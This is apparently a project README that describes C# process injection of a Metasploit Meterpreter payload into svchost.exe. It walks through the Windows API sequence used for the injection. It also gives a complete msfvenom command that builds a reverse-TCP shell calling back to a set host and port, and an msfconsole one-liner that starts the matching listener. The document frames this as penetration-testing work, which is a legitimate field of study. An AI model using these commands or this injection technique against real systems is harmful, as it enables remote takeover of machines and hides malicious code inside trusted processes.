# Windows Code Injection in C#

This project is an example of code injection into a target process in Windows using C#. Code injection allows executing a payload in a running process, which can be useful in penetration testing and the development of security techniques.

## General Description

The code injects a payload (generated with `msfvenom`) into a target process (`svchost.exe`). It uses Windows API functions to:

1. **Create a new process**: The `CreateProcess` function is employed to launch a new process. In this case, the target process is `C:\Windows\System32\svchost.exe`.

2. **Allocate memory**: Once the process is created, `VirtualAllocEx` is used to allocate a block of memory in the process where the payload will be stored.

3. **Write the payload**: Using `WriteProcessMemory`, the payload code is written to the previously allocated memory. This allows the target process to execute the code we provided.

4. **Modify memory protection**: The `VirtualProtectEx` function is used to change the permissions of the allocated memory, allowing code execution (PAGE_EXECUTE_READWRITE).

5. **Create a remote thread**: A thread is generated in the target process using `CreateRemoteThread`, which is responsible for executing the payload in the allocated memory.

6. **Resume the thread**: Finally, `ResumeThread` is used to start the thread, activating the injected payload.

The workflow is set up so that after executing the code, the payload communicates with a Metasploit listener, allowing for remote interaction with the compromised system.

## Payload Generation

Before running the code, you need to create a payload to be injected into the process. Use the following command in Kali Linux:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.84.142 LPORT=443 EXITFUNC=thread -f csharp
```

## Payload Generation

Configure a listener in Metasploit before executing the program using the following command:

```bash
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set EXITFUNC thread;set LPORT 443;set LHOST 172.16.84.142;set ExitOnSession false; run -j -z"
```



